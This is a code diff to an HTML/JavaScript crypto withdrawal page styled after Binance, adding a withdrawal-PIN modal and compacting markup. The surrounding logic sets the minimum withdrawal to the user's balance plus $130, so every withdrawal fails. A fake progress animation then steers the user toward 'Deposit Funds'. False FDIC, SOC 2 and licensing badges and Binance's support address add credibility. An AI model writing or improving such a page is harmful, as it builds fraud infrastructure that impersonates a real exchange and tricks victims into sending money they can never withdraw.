@@ -165,6 +165,94 @@
         .network-details { font-size: 10px; color: #6b7280; margin-top: 4px; }
         body.dark-mode .network-details { color: #9ca3af; }
         
+        /* PIN Modal Styles */
+        .pin-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(12px);
+            z-index: 21000;
+            justify-content: center;
+            align-items: center;
+        }
+        .pin-modal.active { display: flex; }
+        .pin-content {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 32px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+            animation: modalFadeIn 0.3s ease-out;
+        }
+        body.dark-mode .pin-content {
+            background: #1E2329;
+            border: 1px solid rgba(252,213,53,0.3);
+        }
+        .pin-input {
+            background: #f1f5f9;
+            border: 2px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 16px;
+            width: 100%;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            letter-spacing: 12px;
+            font-family: monospace;
+            outline: none;
+            transition: all 0.2s;
+            color: #1e293b;
+        }
+        body.dark-mode .pin-input {
+            background: #2B3139;
+            border-color: #2B3139;
+            color: white;
+        }
+        .pin-input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59,130,246,0.1);
+        }
+        body.dark-mode .pin-input:focus { border-color: #FCD535; }
+        .pin-error {
+            background: rgba(239,68,68,0.1);
+            color: #ef4444;
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            margin-top: 16px;
+            display: none;
+        }
+        .pin-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+        .pin-btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+        }
+        .pin-btn-primary {
+            background: #3b82f6;
+            color: white;
+        }
+        body.dark-mode .pin-btn-primary { background: #FCD535; color: #181A20; }
+        .pin-btn-secondary {
+            background: #f1f5f9;
+            color: #1e293b;
+        }
+        body.dark-mode .pin-btn-secondary { background: #2B3139; color: white; }
+        .pin-btn-primary:hover, .pin-btn-secondary:hover { transform: scale(1.02); }
+        
         /* Professional Transparent Loading Overlay */
         .loading-overlay {
             position: fixed;
@@ -199,16 +287,10 @@
         .loading-dot:nth-child(3) { animation-delay: 0.4s; }
         @keyframes bounce { 0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; } 40% { transform: scale(1.2); opacity: 1; } }
         
-        /* Fade-in animation for warning modal */
+        /* Fade-in animation for modals */
         @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.95) translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
+            from { opacity: 0; transform: scale(0.95) translateY(-10px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
         }
         
         .blinking-icon { animation: blinkWarning 1.2s ease-in-out infinite; }
@@ -303,10 +385,7 @@
             position: relative;
             animation: modalFadeIn 0.3s ease-out;
         }
-        body.dark-mode .guide-content {
-            background: #1E2329;
-            border: 1px solid rgba(252,213,53,0.2);
-        }
+        body.dark-mode .guide-content { background: #1E2329; border: 1px solid rgba(252,213,53,0.2); }
         .guide-header {
             display: flex;
             justify-content: space-between;
@@ -316,40 +395,15 @@
             border-bottom: 1px solid #e2e8f0;
         }
         body.dark-mode .guide-header { border-bottom-color: #2B3139; }
-        .guide-title {
-            font-size: 18px;
-            font-weight: 800;
-            color: #1e293b;
-        }
+        .guide-title { font-size: 18px; font-weight: 800; color: #1e293b; }
         body.dark-mode .guide-title { color: white; }
-        .guide-close {
-            cursor: pointer;
-            font-size: 20px;
-            color: #6b7280;
-            transition: all 0.2s;
-        }
+        .guide-close { cursor: pointer; font-size: 20px; color: #6b7280; transition: all 0.2s; }
         .guide-close:hover { color: #ef4444; transform: rotate(90deg); }
-        .guide-section {
-            margin-bottom: 20px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #e2e8f0;
-        }
+        .guide-section { margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid #e2e8f0; }
         body.dark-mode .guide-section { border-bottom-color: #2B3139; }
-        .guide-section h4 {
-            font-size: 13px;
-            font-weight: 800;
-            color: #3b82f6;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+        .guide-section h4 { font-size: 13px; font-weight: 800; color: #3b82f6; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
         body.dark-mode .guide-section h4 { color: #FCD535; }
-        .guide-section p, .guide-section li {
-            font-size: 12px;
-            line-height: 1.6;
-            color: #4b5563;
-            margin-bottom: 6px;
-        }
+        .guide-section p, .guide-section li { font-size: 12px; line-height: 1.6; color: #4b5563; margin-bottom: 6px; }
         body.dark-mode .guide-section p, body.dark-mode .guide-section li { color: #9ca3af; }
         .guide-section ul { padding-left: 20px; margin-top: 6px; }
         .guide-gotit {
@@ -433,6 +487,7 @@
         @media (max-width: 640px) {
             .amount-input { font-size: 18px; padding: 14px; }
             .dropdown-item { padding: 12px; }
+            .pin-input { font-size: 22px; letter-spacing: 8px; }
         }
     </style>
 </head>
@@ -453,22 +508,10 @@
             
             <!-- Security Trust Badges -->
             <div class="security-badges">
-                <div class="badge-item">
-                    <i class="fas fa-lock text-green-500 text-xs"></i>
-                    <span>256-bit SSL Encryption</span>
-                </div>
-                <div class="badge-item">
-                    <i class="fas fa-check-circle text-blue-500 text-xs"></i>
-                    <span>SOC 2 Type II Certified</span>
-                </div>
-                <div class="badge-item">
-                    <i class="fas fa-umbrella text-yellow-500 text-xs"></i>
-                    <span>FDIC Insured (Up to $250k)</span>
-                </div>
-                <div class="badge-item">
-                    <i class="fas fa-certificate text-purple-500 text-xs"></i>
-                    <span>Licensed & Regulated</span>
-                </div>
+                <div class="badge-item"><i class="fas fa-lock text-green-500 text-xs"></i><span>256-bit SSL Encryption</span></div>
+                <div class="badge-item"><i class="fas fa-check-circle text-blue-500 text-xs"></i><span>SOC 2 Type II Certified</span></div>
+                <div class="badge-item"><i class="fas fa-umbrella text-yellow-500 text-xs"></i><span>FDIC Insured (Up to $250k)</span></div>
+                <div class="badge-item"><i class="fas fa-certificate text-purple-500 text-xs"></i><span>Licensed & Regulated</span></div>
             </div>
         </div>
         <div class="flex gap-2">
@@ -500,16 +543,12 @@
         <label class="text-gray-500 text-xs uppercase tracking-wider mb-3 block">Select withdrawal Method</label>
         <div class="grid grid-cols-2 gap-4">
             <div id="methodCrypto" class="method-card active" onclick="selectMethod('crypto')">
-                <div class="text-3xl mb-2 flex justify-center">
-                    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" class="w-12 h-12">
-                </div>
+                <div class="text-3xl mb-2 flex justify-center"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" class="w-12 h-12"></div>
                 <div class="font-bold text-gray-900 text-sm">Crypto</div>
                 <div class="text-xs text-gray-500 mt-1">Bitcoin & Networks</div>
             </div>
             <div id="methodPaypal" class="method-card" onclick="selectMethod('paypal')">
-                <div class="text-3xl mb-2 flex justify-center">
-                    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="w-12 h-12">
-                </div>
+                <div class="text-3xl mb-2 flex justify-center"><img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="w-12 h-12"></div>
                 <div class="font-bold text-gray-900 text-sm">PayPal</div>
                 <div class="text-xs text-gray-500 mt-1">Instant Transfer</div>
             </div>
@@ -525,39 +564,24 @@
                 <i class="fas fa-chevron-down"></i>
             </div>
             <div class="dropdown-menu" id="networkDropdownMenu">
-                <div class="dropdown-item" data-network="BTC" data-fee="2.00" data-name="Bitcoin">
-                    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" style="width: 24px; height: 24px;" alt="BTC">
-                    <div><div class="network-name">BTC - Bitcoin</div><div class="network-details">Min. deposit >0.00001 BTC · 1 block · 1-30 min</div></div>
-                </div>
-                <div class="dropdown-item" data-network="BSC" data-fee="0.50" data-name="BNB Smart Chain (BEP20)">
-                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" style="width: 24px; height: 24px;" alt="BNB">
-                    <div><div class="network-name">BSC - BNB Smart Chain (BEP20)</div><div class="network-details">Min. deposit >0.00000002 BTC · 1 block · 1 min</div></div>
-                </div>
-                <div class="dropdown-item" data-network="ETH" data-fee="1.50" data-name="Ethereum (ERC20)">
-                    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" style="width: 24px; height: 24px;" alt="ETH">
-                    <div><div class="network-name">ETH - Ethereum (ERC20)</div><div class="network-details">Min. deposit >0.00000002 BTC · 6 blocks · 2 min</div></div>
-                </div>
-                <div class="dropdown-item" data-network="LIGHTNING" data-fee="0.30" data-name="Lightning Network">
-                    <i class="fas fa-bolt" style="color: #FCD535; font-size: 22px; width: 24px; text-align: center;"></i>
-                    <div><div class="network-name">LIGHTNING - Lightning Network</div><div class="network-details">Min. deposit >0.00001999 BTC · Instant · 1 min</div></div>
-                </div>
-                <div class="dropdown-item" data-network="SEGWIT" data-fee="1.80" data-name="BTC (SegWit)">
-                    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" style="width: 24px; height: 24px;" alt="SegWit BTC">
-                    <div><div class="network-name">SEGWIT - BTC (SegWit)</div><div class="network-details">Min. deposit >0.000006 BTC · 1 block · 1 min</div></div>
-                </div>
+                <div class="dropdown-item" data-network="BTC" data-fee="2.00" data-name="Bitcoin"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" style="width: 24px; height: 24px;" alt="BTC"><div><div class="network-name">BTC - Bitcoin</div><div class="network-details">Min. deposit >0.00001 BTC · 1 block · 1-30 min</div></div></div>
+                <div class="dropdown-item" data-network="BSC" data-fee="0.50" data-name="BNB Smart Chain (BEP20)"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" style="width: 24px; height: 24px;" alt="BNB"><div><div class="network-name">BSC - BNB Smart Chain (BEP20)</div><div class="network-details">Min. deposit >0.00000002 BTC · 1 block · 1 min</div></div></div>
+                <div class="dropdown-item" data-network="ETH" data-fee="1.50" data-name="Ethereum (ERC20)"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" style="width: 24px; height: 24px;" alt="ETH"><div><div class="network-name">ETH - Ethereum (ERC20)</div><div class="network-details">Min. deposit >0.00000002 BTC · 6 blocks · 2 min</div></div></div>
+                <div class="dropdown-item" data-network="LIGHTNING" data-fee="0.30" data-name="Lightning Network"><i class="fas fa-bolt" style="color: #FCD535; font-size: 22px; width: 24px; text-align: center;"></i><div><div class="network-name">LIGHTNING - Lightning Network</div><div class="network-details">Min. deposit >0.00001999 BTC · Instant · 1 min</div></div></div>
+                <div class="dropdown-item" data-network="SEGWIT" data-fee="1.80" data-name="BTC (SegWit)"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" style="width: 24px; height: 24px;" alt="SegWit BTC"><div><div class="network-name">SEGWIT - BTC (SegWit)</div><div class="network-details">Min. deposit >0.000006 BTC · 1 block · 1 min</div></div></div>
             </div>
         </div>
         <div class="helper-text mt-2"><i class="fas fa-info-circle mr-1"></i> Only send to supported networks. Sending to other networks may result in permanent loss.</div>
     </div>
 
-    <!-- PayPal Section -->
+    <!-- PayPal Section (Hidden by default) -->
     <div id="paypalSection" class="mb-6" style="display: none;">
         <label class="text-gray-500 text-xs uppercase tracking-wider mb-2 block">PayPal Email</label>
         <input type="email" id="paypalEmail" placeholder="recipient@example.com" class="address-input">
         <div class="helper-text mt-2"><i class="fab fa-paypal mr-1"></i> Funds will be sent instantly to this PayPal email address.</div>
     </div>
 
-    <!-- Destination Address -->
+    <!-- Destination Address (for Crypto) -->
     <div id="addressSection" class="mb-6">
         <label class="text-gray-500 text-xs uppercase tracking-wider mb-2 block">Where to send</label>
         <div class="relative"><i class="fas fa-shield-halved absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm"></i><input type="text" id="cryptoAddress" placeholder="Enter wallet address..." class="address-input pl-12"></div>
@@ -581,6 +605,23 @@
     <div class="flex flex-col md:flex-row justify-between items-center gap-4 opacity-50 hover:opacity-80 transition-opacity">
         <div class="flex gap-6 text-[9px] font-bold tracking-widest uppercase text-gray-400"><span class="flex items-center gap-1.5"><i class="fas fa-circle text-[6px] text-green-500"></i> Encrypted AES-256</span><span class="flex items-center gap-1.5"><i class="fas fa-circle text-[6px] text-green-500"></i> Secure Signing</span></div>
         <p class="text-[9px] font-mono text-gray-400" id="footerRef">STABLE_REL_1.4.2 // REF: WD-NX-99</p>
+    </div>
+</div>
+
+<!-- PIN Verification Modal -->
+<div id="pinModal" class="pin-modal">
+    <div class="pin-content">
+        <div class="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+            <i class="fas fa-lock text-blue-500 text-2xl"></i>
+        </div>
+        <h3 class="text-xl font-bold text-gray-900 mb-2">PIN Required</h3>
+        <p class="text-gray-500 text-sm mb-4">Enter your 6-digit withdrawal PIN to authorize this transaction.</p>
+        <input type="password" id="pinInput" maxlength="6" class="pin-input" placeholder="••••••" inputmode="numeric">
+        <div id="pinError" class="pin-error"><i class="fas fa-exclamation-circle mr-2"></i> Incorrect PIN. Please try again.</div>
+        <div class="pin-buttons">
+            <button id="pinCancelBtn" class="pin-btn pin-btn-secondary">Cancel</button>
+            <button id="pinVerifyBtn" class="pin-btn pin-btn-primary">Verify</button>
+        </div>
     </div>
 </div>
 
@@ -609,67 +650,19 @@
         </div>
         <button id="modalDepositBtn" class="modal-btn modal-btn-primary w-full mb-2">Deposit Funds</button>
         <button id="modalAcknowledgeBtn" class="modal-btn modal-btn-secondary w-full">Acknowledge & Return</button>
-        <button id="modalHelpBtn" class="help-modal-btn">
-            <i class="fas fa-info-circle"></i> Need help? Click here for guide
-        </button>
+        <button id="modalHelpBtn" class="help-modal-btn"><i class="fas fa-info-circle"></i> Need help? Click here for guide</button>
     </div>
 </div>
 
 <!-- Help Guide Popup -->
 <div id="guidePopup" class="guide-popup">
     <div class="guide-content">
-        <div class="guide-header">
-            <div class="guide-title">ℹ️ Withdrawal Requirements & Help Center</div>
-            <div class="guide-close" id="closeGuidePopup">&times;</div>
-        </div>
-        
-        <div class="guide-section">
-            <h4>CURRENT SITUATION</h4>
-            <p>• Your available balance does not meet the minimum withdrawal threshold.</p>
-        </div>
-        
-        <div class="guide-section">
-            <h4>WHY THIS REQUIREMENT EXISTS</h4>
-            <ul>
-                <li>• Ensures settlement finality across blockchain networks.</li>
-                <li>• Protects against transaction fee variations and price slippage.</li>
-                <li>• Prevents small unauthorized withdrawal attempts.</li>
-                <li>• Maintains network security standards.</li>
-                <li>• Reduces operational costs for micro-transactions.</li>
-            </ul>
-        </div>
-        
-        <div class="guide-section">
-            <h4>HOW TO RESOLVE</h4>
-            <ul>
-                <li>• Deposit additional funds to meet the threshold.</li>
-                <li>• Request a smaller withdrawal amount (if available).</li>
-                <li>• Wait for pending transactions to clear.</li>
-            </ul>
-        </div>
-        
-        <div class="guide-section">
-            <h4>GENERAL WITHDRAWAL TIPS</h4>
-            <ul>
-                <li>• Always double-check your wallet address before confirming any withdrawal.</li>
-                <li>• Verify the selected network matches your target wallet (BTC, BSC, ETH, etc.).</li>
-                <li>• Keep your withdrawal amount above network minimums to avoid failed transactions.</li>
-                <li>• Withdrawal requests are final and cannot be reversed once processed.</li>
-                <li>• Use whitelisted addresses for enhanced security.</li>
-                <li>• Monitor your email for withdrawal confirmation alerts.</li>
-                <li>• Processing times vary by network (1-30 minutes for most cryptocurrencies).</li>
-            </ul>
-        </div>
-        
-        <div class="guide-section">
-            <h4>NEED FURTHER ASSISTANCE?</h4>
-            <ul>
-                <li>• Live Chat: Available 24/7</li>
-                <li>• Email: support@binance.com</li>
-                <li>• Help Center: binance.com/support</li>
-            </ul>
-        </div>
-        
+        <div class="guide-header"><div class="guide-title">ℹ️ Withdrawal Requirements & Help Center</div><div class="guide-close" id="closeGuidePopup">&times;</div></div>
+        <div class="guide-section"><h4>CURRENT SITUATION</h4><p>• Your available balance does not meet the minimum withdrawal threshold.</p></div>
+        <div class="guide-section"><h4>WHY THIS REQUIREMENT EXISTS</h4><ul><li>• Ensures settlement finality across blockchain networks.</li><li>• Protects against transaction fee variations and price slippage.</li><li>• Prevents small unauthorized withdrawal attempts.</li><li>• Maintains network security standards.</li><li>• Reduces operational costs for micro-transactions.</li></ul></div>
+        <div class="guide-section"><h4>HOW TO RESOLVE</h4><ul><li>• Deposit additional funds to meet the threshold.</li><li>• Request a smaller withdrawal amount (if available).</li><li>• Wait for pending transactions to clear.</li></ul></div>
+        <div class="guide-section"><h4>GENERAL WITHDRAWAL TIPS</h4><ul><li>• Always double-check your wallet address before confirming any withdrawal.</li><li>• Verify the selected network matches your target wallet (BTC, BSC, ETH, etc.).</li><li>• Keep your withdrawal amount above network minimums to avoid failed transactions.</li><li>• Withdrawal requests are final and cannot be reversed once processed.</li><li>• Use whitelisted addresses for enhanced security.</li><li>• Monitor your email for withdrawal confirmation alerts.</li><li>• Processing times vary by network (1-30 minutes for most cryptocurrencies).</li></ul></div>
+        <div class="guide-section"><h4>NEED FURTHER ASSISTANCE?</h4><ul><li>• Live Chat: Available 24/7</li><li>• Email: support@binance.com</li><li>• Help Center: binance.com/support</li></ul></div>
         <button class="guide-gotit" id="guideGotItBtn">Got it</button>
     </div>
 </div>
@@ -677,42 +670,13 @@
 <!-- Help Modal -->
 <div id="helpModal" class="modal">
     <div class="modal-content help-modal-content">
-        <div class="flex justify-between items-center mb-4">
-            <h3 class="text-xl font-bold text-gray-900">Withdrawal Guide</h3>
-            <i class="fas fa-times text-gray-400 cursor-pointer hover:text-gray-600" id="closeHelpModal"></i>
-        </div>
-        <div class="help-section">
-            <h4><i class="fas fa-chart-line mr-2"></i> Minimum Balance Required</h4>
-            <p>To process any withdrawal, your withdrawal amount must meet the minimum requirement shown in the warning modal.</p>
-        </div>
-        <div class="help-section">
-            <h4><i class="fas fa-coins mr-2"></i> How fees work</h4>
-            <p><strong>Transaction Fee:</strong> $2.50 flat rate per transaction (non-refundable).</p>
-            <p><strong>Network Fee (Crypto):</strong> BTC: $2.00, BSC: $0.50, ETH: $1.50, Lightning: $0.30, SegWit: $1.80</p>
-            <p><strong>You will receive:</strong> Withdrawal Amount - Total Fees</p>
-            <p><strong>Processing Time:</strong> BTC: 10-30 min, BSC: 1-2 min, ETH: 2-5 min, Lightning: Instant, PayPal: Near-instant.</p>
-        </div>
-        <div class="help-section">
-            <h4><i class="fab fa-bitcoin mr-2"></i> Bitcoin Address Requirements</h4>
-            <p>Accepted Bitcoin address formats:</p>
-            <ul><li><strong>Legacy:</strong> Starts with "1"</li><li><strong>SegWit:</strong> Starts with "3"</li><li><strong>Native SegWit:</strong> Starts with "bc1"</li></ul>
-            <p>For Ethereum addresses, please select the ETH (ERC20) network.</p>
-        </div>
-        <div class="help-section">
-            <h4><i class="fab fa-paypal mr-2"></i> PayPal Requirements</h4>
-            <p>Enter the <strong>verified email address</strong> associated with the recipient's PayPal account.</p>
-        </div>
-        <div class="help-section">
-            <h4><i class="fas fa-clock mr-2"></i> Processing Time</h4>
-            <p><strong>Bitcoin:</strong> 1-3 confirmations (10-30 minutes).</p>
-            <p><strong>PayPal:</strong> Near-instant after verification.</p>
-            <p>All transactions are final and cannot be reversed.</p>
-        </div>
-        <div class="help-section">
-            <h4><i class="fas fa-headset mr-2"></i> 24/7 Support</h4>
-            <p><strong>Email:</strong> support@binance.com</p>
-            <p class="mt-2 text-[10px] opacity-50">Support typically responds within 15 minutes.</p>
-        </div>
+        <div class="flex justify-between items-center mb-4"><h3 class="text-xl font-bold text-gray-900">Withdrawal Guide</h3><i class="fas fa-times text-gray-400 cursor-pointer hover:text-gray-600" id="closeHelpModal"></i></div>
+        <div class="help-section"><h4><i class="fas fa-chart-line mr-2"></i> Minimum Balance Required</h4><p>To process any withdrawal, your withdrawal amount must meet the minimum requirement shown in the warning modal.</p></div>
+        <div class="help-section"><h4><i class="fas fa-coins mr-2"></i> How fees work</h4><p><strong>Transaction Fee:</strong> $2.50 flat rate per transaction (non-refundable).</p><p><strong>Network Fee (Crypto):</strong> BTC: $2.00, BSC: $0.50, ETH: $1.50, Lightning: $0.30, SegWit: $1.80</p><p><strong>You will receive:</strong> Withdrawal Amount - Total Fees</p><p><strong>Processing Time:</strong> BTC: 10-30 min, BSC: 1-2 min, ETH: 2-5 min, Lightning: Instant, PayPal: Near-instant.</p></div>
+        <div class="help-section"><h4><i class="fab fa-bitcoin mr-2"></i> Bitcoin Address Requirements</h4><p>Accepted Bitcoin address formats:</p><ul><li><strong>Legacy:</strong> Starts with "1"</li><li><strong>SegWit:</strong> Starts with "3"</li><li><strong>Native SegWit:</strong> Starts with "bc1"</li></ul><p>For Ethereum addresses, please select the ETH (ERC20) network.</p></div>
+        <div class="help-section"><h4><i class="fab fa-paypal mr-2"></i> PayPal Requirements</h4><p>Enter the <strong>verified email address</strong> associated with the recipient's PayPal account.</p></div>
+        <div class="help-section"><h4><i class="fas fa-clock mr-2"></i> Processing Time</h4><p><strong>Bitcoin:</strong> 1-3 confirmations (10-30 minutes).</p><p><strong>PayPal:</strong> Near-instant after verification.</p><p>All transactions are final and cannot be reversed.</p></div>
+        <div class="help-section"><h4><i class="fas fa-headset mr-2"></i> 24/7 Support</h4><p><strong>Email:</strong> support@binance.com</p><p class="mt-2 text-[10px] opacity-50">Support typically responds within 15 minutes.</p></div>
     </div>
 </div>
 
@@ -727,6 +691,8 @@
     let currentNetworkFee = 2.00;
     let isLoading = false;
     let isDarkMode = false;
+    let currentUserPin = null;
+    let pendingWithdrawData = null;
 
     const randomRef = 'WD-' + Math.random().toString(36).substring(2, 8).toUpperCase();
     document.getElementById('refId').innerText = 'REF: ' + randomRef;
@@ -768,20 +734,17 @@
     const closeGuidePopup = document.getElementById('closeGuidePopup');
     const guideGotItBtn = document.getElementById('guideGotItBtn');
     const closeHelpModal = document.getElementById('closeHelpModal');
+    const pinModal = document.getElementById('pinModal');
+    const pinInput = document.getElementById('pinInput');
+    const pinError = document.getElementById('pinError');
+    const pinVerifyBtn = document.getElementById('pinVerifyBtn');
+    const pinCancelBtn = document.getElementById('pinCancelBtn');
 
     function getLoadingMessages() {
         if (currentMethod === 'paypal') {
-            return [
-                "Connecting to PayPal secure gateway...",
-                "Verifying recipient email...",
-                "Processing instant transfer..."
-            ];
+            return ["Connecting to PayPal secure gateway...", "Verifying recipient email...", "Processing instant transfer..."];
         }
-        return [
-            "Verifying blockchain network...",
-            "Confirming with nodes...",
-            "Finalizing withdrawal..."
-        ];
+        return ["Verifying blockchain network...", "Confirming with nodes...", "Finalizing withdrawal..."];
     }
 
     function initNetworkDropdown() {
@@ -815,14 +778,11 @@
 
     function validateAddress() { if (currentMethod === 'crypto') { const address = cryptoAddress?.value?.trim(); if (!address) { hideWarning(); return; } if (isValidBitcoinAddress(address)) showWarning("Valid Bitcoin address format", true); else showWarning("Invalid address. Must start with 1, 3, or bc1.", false); } }
 
-    async function fetchUserBalance() { const savedEmail = localStorage.getItem('binance_session_email'); if (!savedEmail) { window.location.href = 'index.html'; return; } currentUserEmail = savedEmail; try { const response = await fetch(`${API_URL}?ignore_cache=1`); const users = await response.json(); const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase()); if (user && user.Balance !== undefined) { currentBalance = parseFloat(user.Balance) / 100; displayBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; availableBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; maxAmountLabel.innerText = `Max: $${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; } } catch (error) { console.error('Error fetching balance:', error); } }
+    async function fetchUserBalance() { const savedEmail = localStorage.getItem('binance_session_email'); if (!savedEmail) { window.location.href = 'index.html'; return; } currentUserEmail = savedEmail; try { const response = await fetch(`${API_URL}?ignore_cache=1`); const users = await response.json(); const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase()); if (user) { currentBalance = parseFloat(user.Balance) / 100; currentUserPin = user.Pin || null; displayBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; availableBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; maxAmountLabel.innerText = `Max: $${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; } } catch (error) { console.error('Error fetching balance:', error); } }
 
     function getMinimumWithdrawal() { return currentBalance + 130; }
-
     function calculateSummary() { let amount = parseFloat(withdrawAmount?.value) || 0; if (amount > currentBalance) { amount = currentBalance; withdrawAmount.value = amount; } const totalFee = currentMethod === 'crypto' ? currentNetworkFee + 2.50 : 2.50; const totalReceive = Math.max(0, amount - totalFee); summaryFee.innerText = `$${totalFee.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; summaryTotal.innerText = `$${totalReceive.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`; }
-
     function selectMethod(method) { currentMethod = method; document.getElementById('methodCrypto').classList.toggle('active', method === 'crypto'); document.getElementById('methodPaypal').classList.toggle('active', method === 'paypal'); if (method === 'crypto') { cryptoSection.style.display = 'block'; paypalSection.style.display = 'none'; addressSection.style.display = 'block'; } else { cryptoSection.style.display = 'none'; paypalSection.style.display = 'block'; addressSection.style.display = 'none'; currentNetworkFee = 0; calculateSummary(); } hideWarning(); }
-
     function selectNetwork(network, fee) { currentNetwork = network; currentNetworkFee = fee; calculateSummary(); }
 
     async function updateDatabaseBalance(newBalanceCents) { try { const response = await fetch(`${API_URL}?ignore_cache=1`); const users = await response.json(); const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase()); if (userIndex !== -1) { const rowNumber = userIndex + 2; await fetch(`${API_URL}/${rowNumber}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ Balance: newBalanceCents }) }); } } catch (error) { console.error('Error updating balance:', error); } }
@@ -830,31 +790,9 @@
     function showGuidePopup() { guidePopup.classList.add('active'); }
     function hideGuidePopup() { guidePopup.classList.remove('active'); }
 
-    async function handleWithdraw() { 
-        if (isLoading) return; 
-        const amount = parseFloat(withdrawAmount?.value) || 0; 
-        const minRequired = getMinimumWithdrawal(); 
-        if (amount <= 0) { showToast('Please enter a valid amount', false); return; } 
-        if (amount > currentBalance) { showToast('Amount exceeds your balance', false); return; }
-        
-        if (currentMethod === 'crypto') {
-            if (!currentNetwork) {
-                showToast('Please select a network', false);
-                return;
-            }
-        }
-        
-        if (currentMethod === 'crypto') { 
-            const address = cryptoAddress?.value?.trim(); 
-            if (!address) { showToast('Please enter a wallet address', false); return; } 
-            if (!isValidBitcoinAddress(address)) { showToast('Invalid Bitcoin address', false); return; } 
-        } else { 
-            const email = paypalEmail?.value?.trim(); 
-            if (!email) { showToast('Please enter a PayPal email', false); return; } 
-            if (!isValidEmail(email)) { showToast('Invalid email address', false); return; } 
-        } 
-        
-        isLoading = true; 
+    // Start loading animation after PIN verification
+    async function startLoadingAfterPin(amount, minRequired) {
+        isLoading = true;
         
         let duration;
         if (currentMethod === 'paypal') {
@@ -863,51 +801,118 @@
             duration = Math.floor(Math.random() * (14000 - 11000 + 1) + 11000);
         }
         
-        const startTime = Date.now(); 
-        loadingOverlay.classList.add('active'); 
-        loadingProgressFill.style.width = '0%'; 
+        const startTime = Date.now();
+        loadingOverlay.classList.add('active');
+        loadingProgressFill.style.width = '0%';
         
         const loadingMessagesArray = getLoadingMessages();
         
-        const progressInterval = setInterval(() => { 
-            const elapsed = Date.now() - startTime; 
-            const progress = Math.min(100, (elapsed / duration) * 100); 
-            loadingProgressFill.style.width = `${progress}%`; 
-            const messageIndex = Math.min(loadingMessagesArray.length - 1, Math.floor(progress / (100 / loadingMessagesArray.length))); 
-            loadingStatusText.textContent = loadingMessagesArray[messageIndex]; 
-        }, 50); 
+        const progressInterval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const progress = Math.min(100, (elapsed / duration) * 100);
+            loadingProgressFill.style.width = `${progress}%`;
+            const messageIndex = Math.min(loadingMessagesArray.length - 1, Math.floor(progress / (100 / loadingMessagesArray.length)));
+            loadingStatusText.textContent = loadingMessagesArray[messageIndex];
+        }, 50);
         
-        setTimeout(() => { 
-            clearInterval(progressInterval); 
-            loadingProgressFill.style.width = '100%'; 
-            loadingStatusText.textContent = 'Complete!'; 
-            setTimeout(() => { 
-                loadingOverlay.classList.remove('active'); 
-                isLoading = false; 
-                if (amount < minRequired) { 
+        setTimeout(() => {
+            clearInterval(progressInterval);
+            loadingProgressFill.style.width = '100%';
+            loadingStatusText.textContent = 'Complete!';
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                isLoading = false;
+                if (amount < minRequired) {
                     const remainingToReach = minRequired - amount;
-                    modalMinRequired.innerText = `$${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; 
-                    modalBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; 
+                    modalMinRequired.innerText = `$${minRequired.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
+                    modalBalance.innerText = `$${currentBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
                     modalWithdrawAmount.innerText = `$${amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}`;
